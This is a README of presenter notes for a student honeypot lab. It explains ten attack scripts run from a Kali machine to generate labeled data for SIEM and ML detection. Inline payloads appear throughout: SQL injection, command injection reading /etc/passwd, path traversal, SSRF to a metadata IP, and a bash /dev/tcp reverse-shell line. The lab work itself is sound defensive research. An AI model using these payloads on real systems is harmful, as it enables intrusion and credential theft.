# Computer 3 — Attacker Machine

> **Presenter notes for the Computer 3 team member.**
> Print this document and use it as speaking notes for the viva and demo.

> ⚠️ **EDUCATIONAL USE ONLY.** These scripts are run ONLY against the
> honeypot at `192.168.1.10` inside the air-gapped lab. Running any of them
> against a system you do not own or do not have explicit written
> authorization to test is a criminal offense.

---

## 1. Role of Computer 3

Computer 3 is the **attacker**. It generates the traffic that the honeypot
captures, the SIEM visualizes, and the ML pipeline learns from. Without a
deliberate, labeled attack stream, there is no dataset and no model.

Every attack script is:
- **Labeled** — produces events with a known `attack_type_hint` / `attack_class`.
- **Idempotent** — safe to run multiple times.
- **Documented** — see Section 5 below for every attack explained.

---

## 2. Hardware & OS

| Item         | Spec                          |
|--------------|-------------------------------|
| CPU          | 4 cores x86_64                |
| RAM          | 4 GB                          |
| Disk         | 40 GB SSD                     |
| NIC          | 1 GbE                         |
| OS           | Kali Linux 2024.1 (full)      |
| IP (static)  | 192.168.1.30/24               |
| Gateway      | 192.168.1.1                   |

Kali is used because it ships every tool we need out of the box: nmap,
masscan, hydra, nikto, gobuster, dirb, sqlmap, netcat, curl, sshpass.

---

## 3. Folder structure

```
Computer-3-Attacker/
├── README.md                      ← this file (presenter notes)
├── .env.example                   ← target host + port config
├── scripts/
│   ├── 01_portscan.sh             ← nmap + masscan + banner grab
│   ├── 02_bruteforce.sh           ← hydra SSH/FTP/Telnet/HTTP
│   ├── 03_webattacks.sh           ← SQLi/cmdi/XSS/traversal/SSRF via curl
│   ├── 04_dirscan.sh              ← gobuster + dirb directory enum
│   ├── 05_nikto.sh                ← nikto web vuln scan
│   ├── 06_sqlmap.sh               ← sqlmap automated SQLi exploitation
│   ├── 07_netcat.sh               ← banner grab, PJL abuse, revshell sim
│   ├── 08_dos_sim.sh              ← controlled request-burst DoS sim
│   ├── 09_custom_payloads.sh      ← curated payload list across all surfaces
│   ├── 10_credential_post.sh      ← post-auth exfil/upload after brute force
│   ├── run_all_attacks.sh         ← runs all 10 in sequence
│   └── wordlists/
│       ├── users.txt              ← 20 usernames
│       ├── passwords.txt          ← 27 passwords
│       └── dirs.txt               ← ~60 path/dir payloads
└── results/                       ← captured output (gitignored)
```

---

## 4. Configuration

Copy `.env.example` to `.env` and edit if your IPs differ:

```bash
cp .env.example .env
# edit .env — confirm HONEYPOT_HOST=192.168.1.10
```

Every script sources `.env` so you only set the target in one place.

---

## 5. Every attack explained

### 5.1 `01_portscan.sh` — Port scanning & banner grabbing

**Tools:** nmap, masscan, netcat.
**What it does:**
1. `nmap -sS -p-` — full TCP SYN scan of all 65535 ports.
2. `nmap -A` — service + version + OS detection on open ports.
3. `masscan` (if installed) — high-speed port sweep at 2000 pps.
4. Raw TCP banner grab on ports 2222/2121/2323/9100/8080.

**Logs generated:** Recon-class events on the SSH/FTP/Telnet/printer honeypots
(connection logs); HTTP recon on the web containers from the nmap
user-agent. The nmap scan itself is mostly TCP-level, so for the HTTP
containers it appears as `attack_class=recon` requests with nmap's UA.

**Expected results:** All 11 honeypot ports open; banners matching
`SSH-2.0-OpenSSH_8.2p1 Ubuntu`, `ProFTPD 1.3.5`, `BCM96338 ADSL Router`.

> `[Take Screenshot Here]` — nmap `-A` output showing all open ports + banners.

### 5.2 `02_bruteforce.sh` — Credential brute force

**Tool:** hydra.
**What it does:** Runs dictionary attacks against:
- SSH (port 2222) using `users.txt` × `passwords.txt`.
- FTP (port 2121).
- Telnet (port 2323, throttled to 4 threads — telnet is slow).
- HTTP POST form on the router login panel.

**Logs generated:** `ssh_brute_force`, `ftp_brute_force`, `telnet_brute_force`,
and `brute_force_login` events — one per attempt. Successful logins produce
`login_success` / `ftp_login_success` events.

**Expected results:** hydra will discover `admin/admin` on SSH, `admin/admin`
on the router, `root/toor` on FTP, `admin/admin` on Telnet. These feed into
`10_credential_post.sh`.

> `[Take Screenshot Here]` — hydra output showing cracked credentials.

### 5.3 `03_webattacks.sh` — Web application attacks

**Tool:** curl.
**What it does:** Delivers one example of each web attack class:
- SQLi auth bypass (`' OR 1=1--`)
- SQLi UNION exfil
- Reflected XSS
- Command injection on `/api/ping?host=127.0.0.1;id`
- Command injection on camera `/streams?id=1;id`
- Path traversal on camera `/admin?file=../../etc/passwd`
- Path traversal on NAS `/api/files?path=/etc/passwd`
- SSRF on smart TV `/cast?url=http://127.0.0.1:9200/`
- Cmd injection on router `/api/diag?host=...;cat /etc/passwd`
- Cmd injection on smart TV `/app/install?pkg=demo;id`
- Recon on router `/api/config` and NAS `/api/share`
- File upload (implant)

**Logs generated:** one event per curl, each labeled with the correct
`attack_class` by the per-container `classify()` heuristic and Logstash's
mapping.

> `[Take Screenshot Here]` — Kibana discovery showing one event per attack
> with the correct `attack_class`.

### 5.4 `04_dirscan.sh` — Directory enumeration

**Tools:** gobuster, dirb, fallback curl loop.
**What it does:** Brute-forces common paths against the HTTP and camera web
roots using `wordlists/dirs.txt`. The wordlist also contains the specific
vulnerable paths of each container (e.g. `/api/ping?host=...`, `/streams?id=...`)
so the scan finds them.

**Logs generated:** Mostly `directory_enum` events (404s and 200s on
non-standard paths).

### 5.5 `05_nikto.sh` — Web vulnerability scanning

**Tool:** nikto.
**What it does:** Runs a full nikto scan with tuning flags
`1,2,8,9` (interesting files, misconfigurations, SQL injection, command
execution) against the HTTP and camera containers.

**Logs generated:** Many `directory_enum` and `recon` events from nikto's
requests; some will trip the SQLi / cmdi heuristics when nikto sends `'` or
`;` payloads.

> `[Take Screenshot Here]` — nikto report showing identified
> vulnerabilities.

### 5.6 `06_sqlmap.sh` — Automated SQL injection exploitation

**Tool:** sqlmap.
**What it does:**
1. Detection run against `http://192.168.1.10:8080/product?id=1` with
   `--level=3 --risk=2 --dbs`.
2. If a DBMS is identified, dumps the `users` table from the `main` database.

**Logs generated:** Many `sqli` events. The successful dump proves the
SQLi vulnerability end-to-end.

> `[Take Screenshot Here]` — sqlmap dumping the `users` table (admin/s3cr3t).

### 5.7 `07_netcat.sh` — Raw protocol abuse

**Tool:** netcat.
**What it does:**
1. Banner grab on SSH/FTP/Telnet — captures the honeypot banners for the
   report.
2. **PJL abuse** on the printer (port 9100): sends `@PJL FSDIRLIST` and
   `@PJL FSUPLOAD` to read the printer's filesystem (the classic printer
   attack class).
3. **Reverse-shell simulation** — delivers a payload
   (`bash -i >&/dev/tcp/192.168.1.30/4444 0>&1`, URL-encoded) through the
   HTTP `/api/ping?host=` cmd injection. This is NOT an actual reverse shell
   — the honeypot logs the payload, which becomes an `implant`/`cmdi` labeled
   event. We deliberately do not start a listener.

**Logs generated:** `recon` (banners), `abuse` (PJL), `cmdi` (revshell sim).

> `[Take Screenshot Here]` — PJL response showing printer filesystem path.

### 5.8 `08_dos_sim.sh` — DoS simulation

**What it does:** Sends N (default 200, configurable) rapid HTTP requests to
the HTTP container. The container is single-process Flask so it can handle
the load, but the burst creates a visible spike in the Kibana timeline and
heatmap — useful for showing the audience what a DoS signature looks like.

**Logs generated:** N `benign`-looking events clustered tightly in time;
the ML model would learn this temporal pattern as a `dos` subclass if we
extended the taxonomy.

> `[Take Screenshot Here]` — Kibana timeline showing the burst spike.

### 5.9 `09_custom_payloads.sh` — Curated payload suite

**What it does:** Delivers ~25 carefully chosen payloads across all HTTP
containers, covering every variant of every attack class:
- 4 SQLi variants (tautology, UNION, blind-sleep, error-based)
- 5 cmdi variants (`;`, `|`, `&&`, `$(...)`, backtick)
- 3 XSS variants (script, img onerror, svg onload)
- 3 path traversal variants (unix, windows, URL-encoded)
- 3 SSRF variants (localhost, file://, AWS metadata IP)
- 2 RCE-via-eval variants (microwave)
- 3 recon endpoints
- 1 file upload

This is the **primary dataset-generation script** — running it once produces
a rich, balanced set of labeled events for ML training.

### 5.10 `10_credential_post.sh` — Post-auth activity

**What it does:** After `02_bruteforce.sh` discovers the weak credentials,
this script:
1. SSHes in as `admin/admin` and runs `cat /etc/passwd`.
2. Logs into FTP as `root/toor` and downloads `pub/config.bak` (exfil).
3. Uploads a fake implant file to `uploads/implant.txt` (implant).
4. Logs into Telnet as `admin/admin` and runs `ls -la /` and
   `cat /etc/passwd`.

**Logs generated:** `ssh_command_exec`, `ftp_retr` (exfil), `ftp_stor`
(implant), `telnet_command_exec` events.

> `[Take Screenshot Here]` — Telnet session transcript.

---

## 6. Demo procedure (Computer 3 presenter)

1. **"This is Computer 3, the attacker machine, at 192.168.1.30, running
    Kali Linux 2024.1."**
   - `ip a` shows static IP.
   - `[Take Screenshot Here]`

2. **"We have a suite of 10 attack scripts. Each one targets a specific
    class of vulnerability."**
   - `ls scripts/` — show the scripts.
   - Open one script on screen and walk through it (e.g.
     `03_webattacks.sh`).

3. **"Let's run the full suite."**
   - `./scripts/run_all_attacks.sh`
   - This takes ~5–8 minutes total. Narrate as each phase runs.

4. **"Switch to Kibana on Computer 2 to see the events arrive live."**
   - Coordinate with the Computer 2 presenter.

5. **"Here's a sample of one attack's result."**
   - `cat results/03_webattacks.log | head -30`
   - `[Take Screenshot Here]`

6. **"Here's sqlmap dumping the users table."**
   - `cat results/06_sqlmap/main/main.log | tail -30` (path varies by sqlmap
     version)
   - `[Take Screenshot Here]`

7. **"Here's the PJL abuse on the printer."**
   - `cat results/07_netcat_pjl.txt`
   - `[Take Screenshot Here]`

8. **"All attacks complete. The honeypot captured everything; Computer 2
    will now train the model on this data."**

---

## 7. Ethical & safety statement

Every script in this folder is run ONLY against `192.168.1.10` inside the
air-gapped `192.168.1.0/24` lab. The router's WAN port is physically
unplugged during the demo. No script makes any outbound network call beyond
the lab subnet. The "reverse shell" in `07_netcat.sh` is a payload
delivery simulation, not an actual reverse shell — no listener is started.

**Before each demo the operator confirms:**
1. Router WAN cable is unplugged.
2. `HONEYPOT_HOST` in `.env` is `192.168.1.10` (the honeypot, not an
   external system).
3. No script is pointed at any IP outside `192.168.1.0/24`.

Unauthorized use of these tools against third-party systems is illegal under
the Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, India's
IT Act 2000, and equivalent laws worldwide.

---

## 8. Viva questions (Computer 3 presenter)

**Q1.** Why use Kali Linux instead of Ubuntu + manual tool install?
**A1.** Kali ships every tool we need (nmap, hydra, nikto, gobuster, sqlmap,
netcat, sshpass) pre-configured and pre-tested. Using Kali lets us focus the
demo on the attacks themselves rather than on environment setup. It is also
the de-facto standard in the industry, so using it demonstrates familiarity
with real-world red-team tooling.

**Q2.** What is the difference between nmap `-sS` and `-sT`?
**A2.** `-sS` is a SYN scan — it sends only the initial SYN packet and never
completes the TCP handshake, so it's stealthier and faster. `-sT` completes
the full handshake and logs a connection in the application's accept queue.
We use `-sS` for speed; the honeypot still sees the SYN because it's on the
same L2 segment.

**Q3.** How does hydra parallelize brute force?
**A3.** hydra spawns N threads (default 16, we lower to 4 for telnet because
of its slow handshake). Each thread opens an independent connection, sends
credentials, and reports success/failure. `-f` makes it stop on the first
success.

**Q4.** Why does the SQL injection `admin'--` work?
**A4.** The vulnerable app builds the query as
`SELECT * FROM users WHERE user='<input>' AND pass='<input>'`. With
`u=admin'--&p=x` the query becomes
`SELECT * FROM users WHERE user='admin'--' AND pass='x'` — the `--` comments
out the rest, so the password check is skipped and any user named `admin`
matches. The fix is parameterized queries.

**Q5.** How does the command injection `127.0.0.1;id` work?
**A5.** The vulnerable app calls `subprocess.run(f"ping -c 1 {host}",
shell=True)`. The shell interprets `;` as a command separator, so it runs
`ping -c 1 127.0.0.1` followed by `id`. The output of `id` is captured and
returned. The fix is `shell=False` with a list of arguments, plus input
validation.

**Q6.** Why simulate a reverse shell instead of running a real one?
**A6.** Two reasons: (1) safety — a real reverse shell from a container is a
containment risk even in a lab; (2) the academic goal is to capture the
*payload* in the honeypot logs so the ML model can learn to recognize it,
not to actually compromise the container. Delivering the payload via the
HTTP cmd-injection endpoint achieves the logging objective without the
containment risk.

**Q7.** What is the difference between `gobuster` and `dirb`?
**A7.** Both do directory enumeration. Go is faster (gobuster is written in
Go and uses goroutines); dirb is older and slower but has more built-in
extensions and pre-processing. We use gobuster as primary and dirb as
fallback.

**Q8.** How does sqlmap detect injection points?
**A8.** It sends a series of payloads (`'`, ` AND 1=1`, ` AND 1=2`, `UNION
SELECT NULL`, time-based `SLEEP()`) and compares the responses. If the
response to `1=1` differs from `1=2`, or if `SLEEP(5)` adds 5 seconds to the
response time, the parameter is injectable. It then enumerates the DBMS by
sending DBMS-specific syntax.

**Q9.** Is the DoS simulation in script 08 a real DoS?
**A9.** No. It is a controlled burst of 200 requests to populate the
timeline visualization. A real DoS would use SYN floods (L3/L4) or
slowloris (L7) and would require root + raw sockets. We deliberately avoid
those because the honeypot runs on shared lab hardware.

**Q10.** Why don't you delete logs or cover tracks after attacking?
**A10.** The whole point of a honeypot is to capture everything. Track
covering would defeat the data-collection objective. In a real engagement,
blue teams use exactly this kind of log retention to detect post-exploitation
activity — so we keep every event.

---

**End of Computer 3 README.**
